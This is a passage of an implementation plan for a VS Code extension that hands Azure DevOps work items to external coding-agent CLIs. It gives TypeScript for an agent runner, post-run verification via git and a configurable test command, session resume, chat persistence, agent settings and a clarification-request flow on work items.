  flow). For cursor-agent, use `cursor-agent exec "<prompt>"` (non-interactive).
- `GeminiAdapter` (Q9): `gemini -p "<prompt>"` one-shot; resume via
  `gemini -c` with the follow-up as the next prompt (most recent session).

**Step 4: Adapter factory**

In `src/agents/adapters/index.ts`:
```typescript
import { AgentAdapter } from './types';
import { ClaudeAdapter } from './ClaudeAdapter';
import { CodexAdapter } from './CodexAdapter';
import { OpenCodeAdapter } from './OpenCodeAdapter';
import { HermesAdapter } from './HermesAdapter';
import { GeminiAdapter } from './GeminiAdapter';
import { GenericAdapter } from './GenericAdapter';
import { AgentName } from '../types';

export function createAdapter(name: AgentName): AgentAdapter {
  switch (name) {
    case 'claude': return new ClaudeAdapter();
    case 'codex': return new CodexAdapter();
    case 'opencode': return new OpenCodeAdapter();
    case 'hermes': return new HermesAdapter();
    case 'gemini': return new GeminiAdapter();
    default: return new GenericAdapter(name); // pi, openclaw, aider, cursor-agent
  }
}
```

**Step 5: Tests + Verify + Commit**

Tests: spawn stub on `child_process.spawn` (canned stdout, exit code) —
- claude adapter builds `-p` args and parses `session_id` from JSON output
- gemini adapter builds `-p` and `-c` resume args
- generic adapter passes prompt through (and appends `--no-git` for aider)
Run: `npm run compile && npm test`
Commit: `feat: external agent adapters (claude, codex, opencode, hermes, gemini, generic)`

---

### Task 24: Agent Runner + Work Verification (check-back)

**Objective:** Launch agents in the background, stream their output to the webview, track run state, and — when the agent finishes — verify the work (git diff, test run) and report back.

**Files:**
- Create: `src/agents/AgentRunner.ts`
- Modify: `src/webview/ChatViewProvider.ts` (delegate hook, status streaming)
- Modify: `src/services.ts` (wire runner into services)
- Create: `src/test/suite/agents/agentRunner.test.ts`

**Step 1: AgentRunner with state + streaming**

Create `src/agents/AgentRunner.ts`:
```typescript
import * as vscode from 'vscode';
import * as cp from 'child_process';
import * as os from 'os';
import { promisify } from 'util';
import { AgentRun, AgentName, AgentCapability } from './types';
import { AgentRegistry } from './registry';
import { createAdapter } from './adapters';
import { GitService } from '../git/GitService';

// M7 fix: the verify command is USER-configured (trusted input), so shell exec
// is intentional — it respects quotes/globs (e.g. `npm test -- --grep "foo bar"`).
async function execAsync(cmdline: string, cwd: string): Promise<{ stdout: string; stderr: string }> {
  const exec = promisify(cp.exec);
  try {
    const { stdout, stderr } = await exec(cmdline, { cwd, timeout: 120000 });
    return { stdout, stderr };
  } catch (err: any) {
    return { stdout: err?.stdout ?? '', stderr: err?.stderr ?? err?.message ?? String(err) };
  }
}

export interface AgentRunnerCallbacks {
  onStatus(run: AgentRun, delta: string): void;          // stream output chunk
  onComplete(run: AgentRun, summary: string): void;      // final result
}

export class AgentRunner {
  private runs = new Map<string, AgentRun>();
  private aborts = new Map<string, AbortController>();

  constructor(
    private registry: AgentRegistry,
    private git: GitService,
    private callbacks: AgentRunnerCallbacks,
    private store?: { save(runs: AgentRun[]): void; load(): AgentRun[] } // Q7: workspaceState-backed
  ) {
    // Q7: restore persisted runs on construction (extension reload).
    const persisted = this.store?.load() ?? [];
    for (const run of persisted) {
      if (run.status === 'running') {
        run.status = 'interrupted'; // process died with the old extension host
      }
      this.runs.set(run.id, run);
    }
  }

  private persist(): void {
    this.store?.save([...this.runs.values()]);
  }

  async delegate(workItemId: number, prompt: string, agent?: AgentName): Promise<AgentRun> {
    const installed = await this.registry.getInstalled();
    // M2 fix: honor adoCode.agents.autoSelect when no agent is specified.
    let chosen: AgentCapability | undefined;
    if (agent) {
      chosen = installed.find(c => c.name === agent);
    } else {
      const auto = vscode.workspace.getConfiguration('adoCode').get<string>('agents.autoSelect', '');
      chosen = installed.find(c => c.name === auto) ?? installed[0];
    }
    if (!chosen) throw new Error('no agent installed or enabled — configure adoCode.agents.enabled');
    if (!chosen.installed) {
      throw new Error(`agent '${agent ?? 'any'}' is not installed`);
    }
    const workdir = vscode.workspace.workspaceFolders?.[0]?.uri.fsPath ?? '';
    const run: AgentRun = {
      id: `run-${Date.now()}-${workItemId}`,
      workItemId,
      agent: chosen.name,
      workdir,
      status: 'running',
      startedAt: new Date().toISOString(),
    };
    this.runs.set(run.id, run);
    this.persist();
    this.callbacks.onStatus(run, `delegating to ${chosen.displayName}...`);

    const abort = new AbortController();
    this.aborts.set(run.id, abort);
    const adapter = createAdapter(chosen.name);

    // Fire and forget; result delivered via callback
    void (async () => {
      try {
        const { exitCode, output } = await adapter.runTask(run, prompt, abort.signal);
        // H7 fix: if cancelled mid-run, do NOT overwrite the status or run verifyWork.
        if (run.status === 'cancelled') return;
        run.sessionId = adapter.extractSessionId?.(output);
        run.finishedAt = new Date().toISOString();
        // H7 fix: a null exit code on abort means the process was killed — mark cancelled, not succeeded.
        run.status = exitCode === null ? 'cancelled' : (exitCode === 0 ? 'succeeded' : 'failed');
        if (run.status === 'cancelled') { this.persist(); return; }
        // H8 fix: persist the output tail so interrupted runs have something to show.
        run.outputFile = await this.writeOutput(run.id, output);
        const summary = await this.verifyWork(run, output);
        run.summary = summary;
        this.persist();
        this.callbacks.onComplete(run, summary);
      } catch (err) {
        if (run.status === 'cancelled' || abort.signal.aborted) { this.persist(); return; }
        run.status = 'failed';
        run.finishedAt = new Date().toISOString();
        this.persist();
        this.callbacks.onComplete(run, err instanceof Error ? err.message : String(err));
      } finally {
        this.aborts.delete(run.id);
      }
    })();

    return run;
  }

  /** H8: write agent output to a per-run file under the workspace state dir. */
  private async writeOutput(runId: string, output: string): Promise<string | undefined> {
    try {
      const dir = vscode.Uri.joinPath(vscode.Uri.file(vscode.workspace.workspaceFolders?.[0]?.uri.fsPath ?? os.tmpdir()), '.ado-code', 'runs');
      await vscode.workspace.fs.createDirectory(dir);
      const file = vscode.Uri.joinPath(dir, `${runId}.out.txt`);
      // H-8 fix: await the write so the file exists before we return its path.
      await vscode.workspace.fs.writeFile(file, Buffer.from(output.slice(-50000), 'utf8'));
      return file.fsPath;
    } catch {
      return undefined;
    }
  }

  async followUp(runId: string, followUpPrompt: string): Promise<AgentRun> {
    const run = this.runs.get(runId);
    if (!run) throw new Error(`no run with id ${runId}`);
    const adapter = createAdapter(run.agent);
    const abort = new AbortController();
    this.aborts.set(runId, abort);
    run.status = 'running';
    this.persist();
    void (async () => {
      try {
        let result: { exitCode: number | null; output: string };
        if (adapter.resumeTask && run.sessionId) {
          result = await adapter.resumeTask(run, followUpPrompt, abort.signal);
        } else {
          // H13 fix: synthesized follow-up for agents without session resume
          // (codex, aider, pi, openclaw, cursor-agent): re-run one-shot with
          // the previous summary + the follow-up prompt as context.
          const context = `[Previous run summary]\n${run.summary ?? '(no summary)'}\n\n[Follow-up request]\n${followUpPrompt}`;
          result = await adapter.runTask(run, context, abort.signal);
        }
        if (run.status === 'cancelled') return;
        run.finishedAt = new Date().toISOString();
        run.status = result.exitCode === null ? 'cancelled' : (result.exitCode === 0 ? 'succeeded' : 'failed');
        if (run.status === 'cancelled') { this.persist(); return; }
        const summary = await this.verifyWork(run, result.output);
        run.summary = summary;
        this.persist();
        this.callbacks.onComplete(run, summary);
      } catch (err) {
        if (run.status === 'cancelled' || abort.signal.aborted) { this.persist(); return; }
        run.status = 'failed';
        this.persist();
        this.callbacks.onComplete(run, err instanceof Error ? err.message : String(err));
      } finally {
        this.aborts.delete(runId);
      }
    })();
    return run;
  }

  cancel(runId: string): void {
    this.aborts.get(runId)?.abort();
    const run = this.runs.get(runId);
    if (run && run.status === 'running') {
      run.status = 'cancelled';
      this.persist();
    }
  }

  /** Q7: re-attach to an interrupted run that has a session id (post-reload). */
  resumeInterrupted(runId: string, followUp?: string): void {
    const run = this.runs.get(runId);
    if (!run || run.status !== 'interrupted' || !run.sessionId) return;
    void this.followUp(runId, followUp ?? 'Continue where you left off and report status.');
  }

  listRuns(): AgentRun[] {
    return [...this.runs.values()];
  }

  /** Check-back: after the agent finishes, verify the work it claims to have done. */
  private async verifyWork(run: AgentRun, output: string): Promise<string> {
    const lines: string[] = [];
    lines.push(`**Agent finished (${run.agent})** exit=${run.status}`);
    if (run.sessionId) lines.push(`session: \`${run.sessionId}\``);
    lines.push('');

    // 1) What changed in git?
    try {
      const status = await this.git.getStatusPorcelain();
      lines.push('**Changed files:**');
      lines.push(status.trim() || '_no changes detected_');
    } catch (err) {
      lines.push(`_git status unavailable: ${err instanceof Error ? err.message : err}_`);
    }

    // 2) Diff stat (bounded)
    try {
      const diffStat = await this.git.getDiffStat();
      if (diffStat.trim()) {
        lines.push('**Diff stat:**');
        lines.push('```');
        lines.push(diffStat.slice(0, 2000));
        lines.push('```');
      }
    } catch { /* ignore */ }

    // 3) Run the verification command (configurable, default: none)
    const verifyCmd = vscode.workspace.getConfiguration('adoCode').get<string>('agents.verifyCommand', '');
    if (verifyCmd) {
      lines.push(`**Verification (\`${verifyCmd}\`):**`);
      // M7 fix: the verify command is USER-configured (trusted input), so shell
      // execution is defensible — but it must run via `exec` (shell) to respect
      // quotes/globs, and the plan must say so.
      const { stdout, stderr } = await execAsync(verifyCmd, run.workdir);
      lines.push('```');
      lines.push((stdout || stderr).slice(0, 2000));
      lines.push('```');
    }

    // 4) Agent's own final output (bounded)
    lines.push('**Agent output (tail):**');
    lines.push('```');
    lines.push(output.slice(-3000));
    lines.push('```');

    return lines.join('\n');
  }
}
```
(Add `getStatusPorcelain()` and `getDiffStat()` to `GitService` in this task.)

**Step 2: Wire into services + ChatViewProvider**

H5 fix: the runner needs `chatProvider` (to post messages), but `services` is
built BEFORE the provider. So construct `AgentRunner` in `activate()`, after
both exist, and hand it to the provider via `setServices`-style wiring:

```typescript
// In extension.ts activate(), AFTER chatProvider is created:
const agentRunner = new AgentRunner(
  services.agents,
  services.git,
  {
    onStatus: (run, delta) => chatProvider.postMessage({ type: 'agentStatus', run, delta }),
    onComplete: (run, summary) => chatProvider.postMessage({ type: 'agentResult', run, summary }),
  },
  {
    save: runs => context.workspaceState.update('adoCode.agentRuns', runs),
    load: () => context.workspaceState.get<AgentRun[]>('adoCode.agentRuns', []),
  }
);
chatProvider.setAgentRunner(agentRunner);
```
- `ChatViewProvider`: implement `delegateToAgent(prompt, agent?)` — creates the
  prompt (see Task 25), calls `this.agentRunner.delegate(...)`, streams
  `onStatus` → webview, `onComplete` → webview + optional ADO comment.
  M-4 fix (concrete code; workItemId comes from the active work item):
  ```typescript
  async delegateToAgent(prompt: string, agent?: string): Promise<string> {
    if (!this.agentRunner) throw new Error('agent runner not wired');
    if (!this.activeWorkItem) throw new Error('select a work item first');
    const run = await this.agentRunner.delegate(this.activeWorkItem.id, prompt, agent as any);
    // Result is delivered async via agentStatus/agentResult messages; return a
    // placeholder so the tool executor sees the run started.
    return JSON.stringify({ ok: true, runId: run.id, status: run.status });
  }
  ```
- The `delegate_to_agent` tool executor (Task 21) gets wired to this method.
- **H10 fix — wire the tool executor concretely** in `ChatViewProvider`
  (this is the missing link the reviewer flagged; without it, plan/act modes
  have no executor and `delegate_to_agent`/`update_work_item_state` tools
  never work):
  ```typescript
  private executor?: ToolExecutor;
  private agentRunner?: AgentRunner;

  public setAgentRunner(runner: AgentRunner): void {
    this.agentRunner = runner;
    // Executor depends on the runner — build it once both are available.
    this.executor = createToolExecutor(this.services, this._context, {
      onUpdateState: (id, state) => this.updateWorkItemState(id, state),
      onDelegate: (prompt, agent) => this.delegateToAgent(prompt, agent),
      onApprove: async (name, args) => {
        const pick = await vscode.window.showQuickPick(['Approve', 'Reject'], {
          placeHolder: `Allow tool '${name}' with ${JSON.stringify(args)}?`,
        });
        return pick === 'Approve';
      },
    });
    this.executor.setMode(getSettings().mode);
  }
  ```
- **User message dispatch (mode-aware):** in the `userMessage` handler, after
  slash-command parsing (Task 14), route by mode:
  ```typescript
  const mode = getSettings().mode;
  if (mode === 'inline') {
    // stream answer (Task 13); executor tools shown inline if invoked
  } else if (mode === 'plan' || mode === 'act') {
    const budget = getSettings().actToolBudget;
    const result = await runAgenticChat(this.llmClient(), this.executor!, this.conversation, this.llmAbort?.signal, budget);
    this.postMessage({ type: 'assistantMessage', content: result.text, done: true });
    if (mode === 'plan') this.postMessage({ type: 'planReady', plan: result.text });
  }
  ```
  (`this.llmClient()` is a small factory returning `new LlmClient(llmConfig)`
  from current settings — avoids stale config; add it in Task 13.)
- Q7 resume on activation: in `extension.ts` `activate()`, after the runner is
  constructed, offer a QuickPick for interrupted runs with a sessionId:
  ```typescript
  const interrupted = agentRunner.listRuns().filter(r => r.status === 'interrupted' && r.sessionId);
  if (interrupted.length > 0) {
    const pick = await vscode.window.showQuickPick(
      interrupted.map(r => ({ label: `Resume ADO-${r.workItemId} (${r.agent})`, description: r.id })),
      { placeHolder: 'An agent run was interrupted by the restart. Resume it?' }
    );
    if (pick) agentRunner.resumeInterrupted(pick.description!, 'Continue where you left off and report status.');
  }
  ```

**Step 3: Message protocol additions**

Add to `src/shared/messages.ts`:
```typescript
// Webview → Extension
| { type: 'delegateToAgent'; workItemId: number; prompt: string; agent?: string }
| { type: 'agentFollowUp'; runId: string; prompt: string }
| { type: 'agentCancel'; runId: string }
| { type: 'listAgents' }

// Extension → Webview
| { type: 'agentStatus'; run: AgentRun; delta: string }
| { type: 'agentResult'; run: AgentRun; summary: string }
| { type: 'agentList'; agents: AgentCapability[] }
```

M-3 fix: after editing `src/shared/messages.ts`, RE-SYNC the webview copy
(`src/webview-ui/src/types.ts` — Task 4 copies it) so App.tsx compiles against
the new message types. Add a one-line copy step to this task's verify:
```bash
cp src/shared/messages.ts src/webview-ui/src/types.ts
```

**Step 4: Tests + Verify + Commit**

Tests: fake registry/adapter — delegate() calls adapter, verifyWork produces
summary containing git status; cancel aborts.
Run: `npm run compile && npm test`
Commit: `feat: agent runner with background execution and work verification`

---

### Task 25: Task Handoff UX (assign ADO work item to an agent)

**Objective:** One-click handoff: pick an ADO work item → auto-create branch (Task 10) → build a rich prompt from the work item (title, description, acceptance criteria, comments) → delegate to the chosen agent → stream progress → check back.

**Files:**
- Modify: `src/webview/ChatViewProvider.ts` (prompt builder + delegate command)
- Modify: `src/llm/prompts.ts` (buildAgentPrompt)
- Modify: `package.json` (commands + menus)
- Modify: `src/webview-ui/src/App.tsx` (agent picker UI)

**Step 1: Prompt builder from work item**

Add to `src/llm/prompts.ts`:
```typescript
export function buildAgentPrompt(
  workItem: WorkItemContext & { state?: string },
  branch: string,
  projectContext?: string
): string {
  const lines = [
    `You are working on Azure DevOps work item #${workItem.id}: ${workItem.title}`,
    ``,
    `State: ${workItem.state || 'N/A'}`,
    `Description:`,
    workItem.description || '(none)',
    ``,
    `Acceptance criteria:`,
    workItem.acceptanceCriteria || '(none)',
    ``,
    `Tags: ${workItem.tags || '(none)'}`,
  ];

  // Include the discussion thread — especially clarification Q&A the developer
  // collected before handoff (Task 28). This is the whole point of the
  // review-and-clarify step: the agent must build against the clarified spec.
  if (workItem.comments && workItem.comments.length > 0) {
    lines.push(``, `Discussion thread (clarifications, latest first):`);
    for (const c of workItem.comments.slice().reverse()) {
      lines.push(`- ${c.author}: ${c.text}`);
    }
  }

  lines.push(
    projectContext ? `\nProject context:\n${projectContext}` : '',
    ``,
    `Working branch: ${branch}`,
    `When finished: run the project's tests/lint if present, then summarize what you changed and why. Do NOT commit unless asked.`
  );

  return lines.join('\n');
}
```

**Step 2: Handoff flow in ChatViewProvider**

```typescript
async startTaskWithAgent(workItemId: number, agent?: string): Promise<void> {
  // 1) Git: repo check + branch creation (reuse Task 10 flow)
  const gitOk = await this.ensureGitReady(workItemId);
  if (!gitOk) return;

  // 2) Fetch the full work item + discussion thread (clarification Q&A included)
  const project = this.activeProject(); // H-4
  const { detail, comments } = await this.services.ado.getWorkItemWithDiscussion(project, workItemId);
  this.activeWorkItem = {
    id: detail.id,
    title: detail.fields['System.Title'],
    state: detail.fields['System.State'],
    description: detail.fields['System.Description'] || '',
    acceptanceCriteria: detail.fields['Microsoft.VSTS.Common.AcceptanceCriteria'] || '',
    tags: detail.fields['System.Tags'] || '',
    comments: comments.map(c => ({ author: c.createdBy.displayName, text: c.text, date: c.createdDate })),
  };

  // 3) Build the prompt — includes the thread, so the agent gets the
  //    clarified spec the developer collected via Task 28
  const branch = await this.services.git.getCurrentBranch();
  const prompt = buildAgentPrompt(this.activeWorkItem, branch ?? 'unknown');

  // 4) Delegate (Task 24) — status + result stream back to the webview.
  // H-3 fix: the runner is wired via setAgentRunner (Task 24), NOT on Services.
  if (!this.agentRunner) throw new Error('agent runner not wired yet (Task 24)');
  await this.agentRunner.delegate(workItemId, prompt, agent);
}
```

**Step 3: Commands + UI**

- package.json: `adoCode.delegateToAgent` command (title "Delegate to Agent…")
  and a context-menu entry on work item nodes ("Assign to Agent…") that prompts
  for agent choice (QuickPick of installed agents from `registry.getInstalled()`).
- App.tsx: agent picker dropdown (installed agents, from `agentList` message) +
  "Delegate" button; per-run status line (spinner while `running`, result panel
  with the verify summary); "Follow-up" input when a run has a session id.

**Step 4: Verify + Commit**

Run: `npm run compile`
Commit: `feat: one-click task handoff to external agents`

---

### Task 26: Multi-Turn Instruction (conversation + agent follow-ups)

**Objective:** Multi-turn conversations: persist chat history across webview re-opens, keep LLM context across turns (not just one-shot), and support iterative follow-up prompts to external agents via session resume.

**Files:**
- Modify: `src/webview/ChatViewProvider.ts` (conversation state, history persistence)
- Modify: `src/webview-ui/src/App.tsx` (getState/setState persistence, follow-up UI)
- Modify: `src/llm/agentic.ts` (reuse conversation history)
- Modify: `src/shared/messages.ts` (session message types)
- Create: `src/test/suite/webview/conversation.test.ts`

**Step 1: Persist conversation history**

- Webview side: on every message change, `vscode.setState({ history: messages })`;
  on load, `vscode.getState()` restores it (Task 4 already declares these APIs).
- Host side: `private conversation: LlmMessage[]` is ALREADY declared in Task 13
  (Step 5, H-2 fix) — do NOT re-declare. This task makes `handleUserMessage`
  append user + assistant turns to it instead of rebuilding `[system, user]`
  each time. Cap at ~20 turns with a simple trim (drop oldest non-system
  messages).
- `clearConversation` message + "Clear chat" button.
- **Q4 (cross-restart):** persist the conversation to `context.workspaceState`
  (keyed by workspace folder, capped at last 50 messages):
  ```typescript
  private persistConversation(): void {
    const capped = this.conversation.slice(-50);
    // M8 fix: key by folder fsPath (names collide across machines/folders).
    // H-8 fix: use this._context (the provider's field), not a bare `context`.
    const key = vscode.workspace.workspaceFolders?.[0]?.uri.fsPath ?? 'default';
    this._context.workspaceState.update(`adoCode.chatHistory:${key}`, capped);
  }
  ```
  On activation, if history exists, offer a "Continue previous session?"
  QuickPick (Yes → restore into `this.conversation` and send to webview;
  No → clear). `persistConversation()` is called after every user/assistant turn.

**Step 2: Follow-up to external agents**

- Webview "Follow-up" input on a completed run (Task 25 UI) sends
  `agentFollowUp { runId, prompt }` → `AgentRunner.followUp()` (Task 24) which
  resumes the agent session (`claude --resume <id>`, `opencode run -s <id>`,
  `hermes --continue`).
- Runs without session support (codex, generic) get a synthesized follow-up:
  re-run one-shot with `[previous summary] + follow-up prompt`.
- Mark follow-up turns in the UI (same run thread, appended).

**Step 3: Multi-turn tool calling**

`runAgenticChat` (Task 21) is invoked with the persisted `conversation` array so
tool-calling turns accumulate context across user messages.

**Step 4: Tests + Verify + Commit**

Test: conversation trim caps at 20 turns; state round-trips.
Run: `npm run compile && npm test`
Commit: `feat: multi-turn conversations with agent session resume`

---

### Task 27: Agent Settings, Welcome View + Final Integration

**Objective:** Config surface for agents (enable/disable, verify command, per-agent model/tools), welcome-view updates, and end-to-end verification of the agent orchestration flow.

**Files:**
- Modify: `package.json` (configuration schema)
- Modify: `src/config/settings.ts`
- Modify: `src/agents/registry.ts` (M3: honor `adoCode.agents.enabled` in detect())
- Modify: `src/webview-ui/src/App.tsx` (agent setup in welcome view)
- Modify: `Task 20`-style manual test checklist (new Step 7 in this task)

**Step 1: Configuration schema**

Add to `adoCode` configuration:
```json
"adoCode.agents.enabled": {
  "type": "array",
  "items": { "type": "string", "enum": ["claude", "codex", "opencode", "hermes", "pi", "openclaw", "aider", "gemini", "cursor-agent"] },
  "default": ["claude", "codex", "opencode", "hermes", "pi", "openclaw", "aider", "gemini", "cursor-agent"],
  "description": "Which external agents ADO Code may delegate to (Q9: aider, gemini, cursor-agent added). M17: default includes all registered agents; users can prune."
},
"adoCode.agents.verifyCommand": {
  "type": "string",
  "default": "",
  "description": "Shell command run after an agent finishes to verify work (e.g. 'npm test'). Empty = skip."
},
"adoCode.agents.autoSelect": {
  "type": "string",
  "default": "",
  "enum": ["", "claude", "codex", "opencode", "hermes", "pi", "openclaw", "aider", "gemini", "cursor-agent"],
  "description": "Default agent for delegation when none is specified (M-9: includes all 9 registered agents)"
}
```
Update `AdoCodeSettings` + `getSettings()` accordingly. `AgentRegistry.detect()`
consults `agents.enabled` before probing binaries.

**Step 2: Welcome view**

In the welcome screen (Task 19), add an "Agents" section: list detected
installed agents with versions; enable/disable toggles; verify-command input;
"install hint" link for missing agents (e.g. `npm install -g @anthropic-ai/claude-code`).

**Step 3: Integration test checklist**

1. With claude installed: select a work item → "Assign to Agent…" → pick Claude →
   branch created, agent runs, output streams to chat.
2. After completion: verify summary shows changed files + diff stat; optional
   verify command ran.
3. Send a follow-up prompt → agent resumes same session (verify via output).
4. Ask the chat LLM to "check my work items" → tool call `get_work_items` fires,
   result shown; ask it to "close task 42" → `update_work_item_state` fires and
   the changelog hook (Task 11) runs.
5. Uninstall scenario: agent disabled/not installed → QuickPick hides it,
   delegation fails with a clear message.
6. Chat history survives sidebar collapse (getState/setState).
7. Mode switching (Q8): switch to `plan` and ask the LLM to "edit file X" →
   the mutating tool is blocked with a plan-mode error; switch to `act` and ask
   the same → the tool runs (or hits the terminal allowlist).
8. Multiple orgs (Q1): configure two orgs in `adoCode.organizations`, run
   "Switch organization" → QuickPick appears, `AdoClient` is recreated, work
   items reload from the new org.
9. PR flow (Q5): complete a task with `adoCode.git.prOnCompletion: true` →
   push+PR QuickPick appears; with `gh` authenticated, a PR is created with
   `ADO-<id>` title.
10. Changelog entry (Q6): verify the entry includes `branch: feature/... @ commit: a1b2c3d`.
11. Restart resilience (Q4/Q7): with chat history + an interrupted agent run,
    restart VS Code → "Continue previous session?" and "Resume run?" prompts
    appear; resuming re-attaches via the adapter.
12. New agents (Q9): with `aider`/`gemini`/`cursor-agent` installed, verify they
    appear in the delegation QuickPick and their adapters produce runs.

**Step 4: Commit**

```bash
git add -A
git commit -m "feat: agent settings, welcome view, and end-to-end agent orchestration"
```

---

### Task 28: Task Detail Review & Clarification Feedback

**Objective:** Give the developer a first-class "review before you build" step: inspect the full work item (description, acceptance criteria, comments, creator, state) and — when the task is underspecified — send a clarification request back to the work item's discussion thread, @mentioning the creator (business analyst/tester), optionally moving the item to a "needs info" state. Then check back for replies.

**Motivation:** Tasks are often created by BAs/testers; the developer may need more detail before executing. This task adds the "ask the creator" loop so nothing gets built on assumptions.

**Files:**
- Modify: `src/ado/types.ts` (add `System.CreatedBy` to `AdoWorkItem`)
- Modify: `src/ado/client.ts` (add `getCreatedBy` helper if needed; comments API already exists from Task 7)
- Modify: `src/webview/ChatViewProvider.ts` (reviewTaskDetail, requestClarification, checkTaskReplies)
- Modify: `src/ado/WorkItemsTreeProvider.ts` (context menu: Review Task, Request Clarification)
- Modify: `src/shared/messages.ts` (new message types)
- Modify: `package.json` (commands + menus + config)
- Modify: `src/webview-ui/src/App.tsx` (task detail panel + clarification input)
- Modify: `src/config/settings.ts` (clarification state setting)
- Create: `src/test/suite/ado/clarification.test.ts`

**Step 1: Extend ADO types + client**

Add the creator to the work item type (needed to @mention them):

```typescript
// In AdoWorkItem.fields:
'System.CreatedBy'?: { displayName: string; uniqueName: string };
'System.CreatedDate'?: string;
'System.ChangedDate'?: string;
```

In `AdoClient`, `getWorkItemWithDiscussion` is already defined (Task 7, H1 fix) —
it returns detail + comments + creator in one call; no new endpoints needed.

**Step 2: Review flow in ChatViewProvider**

Add handlers:

```typescript
/** Full-detail review: fetch work item + discussion, post both to the webview. */
async reviewTaskDetail(workItemId: number): Promise<void> {
  this.postMessage({ type: 'loading', loading: true });
  try {
    const project = this.activeProject(); // H-4
    const { detail, comments, creator } = await this.services.ado.getWorkItemWithDiscussion(project, workItemId);
    this.activeWorkItem = {
      id: detail.id,
      title: detail.fields['System.Title'],
      description: detail.fields['System.Description'] || '',
      acceptanceCriteria: detail.fields['Microsoft.VSTS.Common.AcceptanceCriteria'] || '',
      tags: detail.fields['System.Tags'] || '',
      comments: comments.map(c => ({ author: c.createdBy.displayName, text: c.text, date: c.createdDate })),
    };
    this.postMessage({
      type: 'workItemDetail',
      item: {
        id: detail.id,
        title: detail.fields['System.Title'],
        state: detail.fields['System.State'],
        assignedTo: detail.fields['System.AssignedTo']?.displayName ?? '',
        workItemType: detail.fields['System.WorkItemType'],
        description: detail.fields['System.Description'] ?? '',
        acceptanceCriteria: detail.fields['Microsoft.VSTS.Common.AcceptanceCriteria'] ?? '',
        tags: detail.fields['System.Tags'] ?? '',
        areaPath: detail.fields['System.AreaPath'] ?? '',
        iterationPath: detail.fields['System.IterationPath'] ?? '',
        creator: creator?.displayName ?? '',
        comments: this.activeWorkItem.comments ?? [],
      },
    });
  } catch (err) {
    const message = err instanceof Error ? err.message : String(err);
    this.postMessage({ type: 'error', message });
  } finally {
    this.postMessage({ type: 'loading', loading: false });
  }
}

/** Ask the creator (or whoever) for clarification on the discussion thread. */
async requestClarification(workItemId: number, question: string, mentionCreator = true): Promise<void> {
  const project = this.activeProject(); // H-4
  const { creator } = await this.services.ado.getWorkItemWithDiscussion(project, workItemId);

  // Mention syntax: ADO renders `<@uniqueName>` as a clickable @mention in the
  // web UI discussion. Fall back to plain displayName + email if mention fails.
  const mention = creator && mentionCreator
    ? `@${creator.displayName} <@${creator.uniqueName}>`
    : '';

  const text = [
    mention ? `**Clarification requested from ${creator?.displayName ?? 'the task owner'}:**` : '**Clarification requested:**',
    ``,
    question,
    ``,
    `_Requested via ADO Code — please reply on this thread._`,
  ].join('\n');

  await this.services.ado.addComment(project, workItemId, text);

  // Optionally move to a "needs info" state so it shows up in triage
  const needsInfoState = vscode.workspace.getConfiguration('adoCode').get<string>('ado.clarificationState', 'Blocked');
  if (needsInfoState) {
    try {
      // C9 fix: System.History is read-only; only patch System.State.
      await this.services.ado.updateWorkItem(project, workItemId, [
        { op: 'add', path: '/fields/System.State', value: needsInfoState },
      ]);
    } catch (err) {
      // State change is best-effort (may not be a valid transition for this
      // work item type/process template); the comment is the source of truth.
      vscode.window.showWarningMessage(`ADO Code: comment posted, but state change to '${needsInfoState}' failed: ${err instanceof Error ? err.message : err}`);
    }
  }

  vscode.window.showInformationMessage(`ADO Code: clarification request posted to ADO-${workItemId}.`);
}

/** Check back for replies on the thread. */
async checkTaskReplies(workItemId: number): Promise<void> {
  const project = this.activeProject(); // H-4
  const comments = await this.services.ado.getComments(project, workItemId);
  this.postMessage({ type: 'taskReplies', workItemId, comments });
  // Refresh the active work item's thread so the next system prompt / agent
  // prompt picks up the clarification Q&A that just arrived.
  if (this.activeWorkItem?.id === workItemId) {
    this.activeWorkItem.comments = comments.map(c => ({ author: c.createdBy.displayName, text: c.text, date: c.createdDate }));
  }
}
```

**Step 3: Message protocol**

Add to `src/shared/messages.ts`:
```typescript
// Webview → Extension
| { type: 'reviewTaskDetail'; workItemId: number }
| { type: 'requestClarification'; workItemId: number; question: string; mentionCreator: boolean }
| { type: 'checkTaskReplies'; workItemId: number }

// Extension → Webview
| { type: 'taskReplies'; workItemId: number; comments: WorkItemComment[] }
```
M-3 fix: re-sync the webview copy so App.tsx compiles against the new types:
```bash
cp src/shared/messages.ts src/webview-ui/src/types.ts
```
Extend `WorkItemDetail` with `creator?: string` and `comments: WorkItemComment[]`
(already present but now actually populated).

**Step 4: Tree view context menu + commands**

In `package.json`:
```json
"commands": [
  { "command": "adoCode.reviewTaskDetail", "title": "Review Task Detail" },
  { "command": "adoCode.requestClarification", "title": "Request Clarification…" },
  { "command": "adoCode.checkTaskReplies", "title": "Check Replies" }
],
"menus": {
  "view/item/context": [
    { "command": "adoCode.reviewTaskDetail", "when": "viewItem == workItemNode", "group": "inline" },
    { "command": "adoCode.requestClarification", "when": "viewItem == workItemNode", "group": "inline" },
    { "command": "adoCode.checkTaskReplies", "when": "viewItem == workItemNode", "group": "inline" }
  ]
}
```
In `extension.ts` (HIGH fix: `WorkItemNode` is exported from the tree provider — import it alongside `WorkItemsTreeProvider`):
```typescript
import { WorkItemNode } from './ado/WorkItemsTreeProvider';

vscode.commands.registerCommand('adoCode.reviewTaskDetail', (node: WorkItemNode) => chatProvider.reviewTaskDetail(node.workItemId)),
vscode.commands.registerCommand('adoCode.requestClarification', async (node: WorkItemNode) => {
  const question = await vscode.window.showInputBox({
    prompt: `Clarification request for ADO-${node.workItemId}: what detail do you need?`,
    placeHolder: 'e.g. What is the expected behavior when the user cancels?',
    ignoreFocusOut: true,
  });
  if (question) await chatProvider.requestClarification(node.workItemId, question);
}),
vscode.commands.registerCommand('adoCode.checkTaskReplies', (node: WorkItemNode) => chatProvider.checkTaskReplies(node.workItemId)),
```

**Step 5: Configuration**

```json
"adoCode.ado.clarificationState": {
  "type": "string",
  "default": "Blocked",
  "description": "State to set on a work item when clarification is requested. Empty string = do not change state. (Must be a valid state for your process template.)"
},
"adoCode.ado.warnOnSparseTask": {
  "type": "boolean",
  "default": true,
  "description": "Before starting a task with no description AND no acceptance criteria, warn and offer to review detail or request clarification"
}
```

**Step 6: Webview UI**

In `App.tsx`:
- Task detail panel (shown on `workItemDetail` message): title, state badge, creator,
  description, acceptance criteria, tags, and the discussion thread (comments,
  newest last).
- "Request clarification" button on the panel → input box (host-side `showInputBox`
  from Step 4, or inline textarea) → posts `requestClarification`.
- "Check replies" button → posts `checkTaskReplies`; new comments appear in the
  thread, highlighted (compare against previously seen comment ids via
  `vscode.getState()`).

